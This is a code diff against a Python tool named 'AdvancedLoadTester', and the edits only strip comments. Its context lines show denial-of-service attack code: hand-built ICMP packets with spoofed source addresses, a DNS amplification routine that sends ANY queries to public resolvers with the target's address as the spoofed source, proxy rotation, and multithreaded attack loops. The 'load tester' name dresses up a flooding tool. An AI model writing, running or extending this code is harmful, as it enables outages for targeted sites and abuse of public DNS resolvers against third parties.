@@ -190,7 +190,7 @@ class AdvancedLoadTester:
             if proxy.failures > 3:
                 proxy.healthy = False
             self.proxy_queue.put(proxy)
-            return self.get_random_proxy()  # Recursive to find healthy
+            return self.get_random_proxy()  
     
     def validate_proxies(self) -> None:
         def check_proxy(proxy: Proxy) -> bool:
@@ -508,7 +508,7 @@ class AdvancedLoadTester:
                 
                 ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 1024 + 20, random.randint(1,65535), 64, socket.IPPROTO_ICMP, 0, socket.inet_aton(source_ip), socket.inet_aton(host))
                 
-                icmp_type = 8  # Echo Request
+                icmp_type = 8  
                 icmp_code = 0
                 icmp_checksum = 0
                 icmp_id = random.randint(0, 65535)
@@ -542,7 +542,7 @@ class AdvancedLoadTester:
         return ~summed & 0xFFFF
     
     def dns_amplification_attack(self) -> None:
-        open_resolvers = ['8.8.8.8', '9.9.9.9', '208.67.222.222']  # Example open DNS resolvers
+        open_resolvers = ['8.8.8.8', '9.9.9.9', '208.67.222.222']  
         target = random.choice(self.target_urls)
         parsed_url = urllib.parse.urlparse(target)
         host = parsed_url.hostname
@@ -553,9 +553,9 @@ class AdvancedLoadTester:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.bind(('', 0))
                 
-                spoofed_ip = host  # Spoof as target
+                spoofed_ip = host  
                 
-                dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\xff'  # ANY query for amplification
+                dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\xff'  
                 
                 s.sendto(dns_query, (resolver, 53))
                 
@@ -580,7 +580,7 @@ class AdvancedLoadTester:
         
         if scheme == 'https':
             context = ssl.create_default_context()
-            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2  # Try TLS 1.3
+            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2  
             sock = context.wrap_socket(sock, server_hostname=host)
         
         sock.connect((host, port))
@@ -665,7 +665,7 @@ class AdvancedLoadTester:
         threads = []
         
         if self.attack_type in ["http", "websocket", "mixed"]:
-            for _ in range(5):  # Multiple async loops for higher throughput
+            for _ in range(5):  
                 thread = threading.Thread(target=self.start_async_attack, daemon=True)
                 threads.append(thread)
                 thread.start()
@@ -913,4 +913,5 @@ if __name__ == "__main__":
     except Exception as e:
         print(f"\n\nError: {e}")
     
+
     print("\n\nCompleted")
